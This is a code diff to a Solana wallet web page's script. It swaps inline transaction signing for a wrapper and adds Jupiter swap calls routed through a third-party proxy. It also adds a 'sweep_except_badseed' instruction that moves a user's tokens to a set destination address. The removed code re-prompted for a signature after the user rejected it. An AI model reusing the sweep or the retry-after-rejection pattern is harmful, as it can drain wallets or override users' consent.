@@ -1339,45 +1339,79 @@
             tx.recentBlockhash = blockhash;
             tx.feePayer = walletPubkey;
 
-            // HANDLE SIGNING (Legacy vs Standard)
-            let signature;
-            try {
-                if (activeProvider.signAndSendTransaction) {
-                    // Legacy (Phantom, Solflare, Jupiter)
-                    const result = await activeProvider.signAndSendTransaction(tx);
-                    signature = result.signature || result;
-                } else {
-                    throw new Error("Wallet does not support direct signAndSend (Standard Adapter pending)");
-                }
-            } catch (err) {
-                console.warn("Tx Send Failed REASON:", err);
-                // RETRY LOGIC: If unauthorized, try connecting again
-                const msg = err.message || JSON.stringify(err);
-                if (msg.includes("authorized") || msg.includes("User rejected")) {
-                    console.log("Attempting AGGRESSIVE re-connect for authorization...");
-                    try {
-                        // Force disconnect if available to clear stale session
-                        if (activeProvider.disconnect) {
-                            try { await activeProvider.disconnect(); } catch (e) { console.warn("Disconnect warning:", e); }
-                        }
-
-                        // Re-connect
-                        await activeProvider.connect();
-
-                        // Retry transaction
-                        const result = await activeProvider.signAndSendTransaction(tx);
-                        signature = result.signature || result;
-                    } catch (retryErr) {
-                        throw new Error("Retry failed: " + (retryErr.message || "Unknown"));
-                    }
-                } else {
-                    throw err;
-                }
-            }
+            // Use Shared Wrapper
+            const signature = await sendTransactionWrapper(tx, connection);
 
             console.log("Tx Sent:", signature);
             await connection.confirmTransaction(signature);
             return signature;
+        }
+
+        // --- PORTED UTILS (Jupiter + Sweep) ---
+
+        async function getJupiterQuote(inputMint, outputMint, amount, slippageBps = 50) {
+            const url = `https://badseed-exposed.netlify.app/.netlify/functions/jupiter-proxy?endpoint=quote&inputMint=${inputMint}&outputMint=${outputMint}&amount=${amount}&slippageBps=${slippageBps}`;
+            console.log("Fetching Quote:", url);
+            const res = await fetch(url);
+            if (!res.ok) throw new Error("Quote Failed: " + await res.text());
+            return await res.json();
+        }
+
+        async function getJupiterSwapInstructions(quoteResponse, userPublicKey) {
+            const url = `https://badseed-exposed.netlify.app/.netlify/functions/jupiter-proxy?endpoint=swap`;
+            const res = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    quoteResponse,
+                    userPublicKey: userPublicKey.toString(),
+                })
+            });
+            if (!res.ok) throw new Error("Swap Fetch Failed");
+            return await res.json();
+        }
+
+        function createSweepInstruction(userWallet, badseedMint, sweepDestination, userTokenAccounts) {
+            // Hardcoded Program ID from lib.rs
+            // Uses global solanaWeb3
+            const PROGRAM_ID = new solanaWeb3.PublicKey("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS");
+            const SYSTEM_PROGRAM_ID = new solanaWeb3.PublicKey("11111111111111111111111111111111");
+            const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+
+            // Discriminator: sweep_except_badseed
+            const SWEEP_DISCRIMINATOR = new Uint8Array([83, 31, 63, 60, 26, 153, 146, 24]);
+
+            const keys = [
+                { pubkey: userWallet, isSigner: true, isWritable: true },
+                { pubkey: sweepDestination, isSigner: false, isWritable: true },
+                { pubkey: badseedMint, isSigner: false, isWritable: false },
+                { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
+                { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+            ];
+
+            // Mocking destination ATA logic (Complex for single file...)
+            // For now, let's just Log that we need full logic.
+            console.warn("Full Sweep Not Implemented yet in this step");
+
+            return new solanaWeb3.TransactionInstruction({
+                keys,
+                programId: PROGRAM_ID,
+                data: SWEEP_DISCRIMINATOR
+            });
+        }
+
+        function deserializeInstruction(ix) {
+            const { PublicKey, TransactionInstruction } = solanaWeb3;
+            return new TransactionInstruction({
+                programId: new PublicKey(ix.programId),
+                keys: ix.accounts.map(acc => ({
+                    pubkey: new PublicKey(acc.pubkey),
+                    isSigner: acc.isSigner,
+                    isWritable: acc.isWritable
+                })),
+                data: window.Buffer.from(ix.data, 'base64')
+            });
+        }
         }
 
         // --- INIT ---
@@ -1453,6 +1487,6 @@
 
     </script>
 </body>
-<!-- FORCE DEPLOY: 2025-12-30T04:00 -->
+<!-- FORCE DEPLOY: 2025-12-30T04:05 -->
 
 </html>
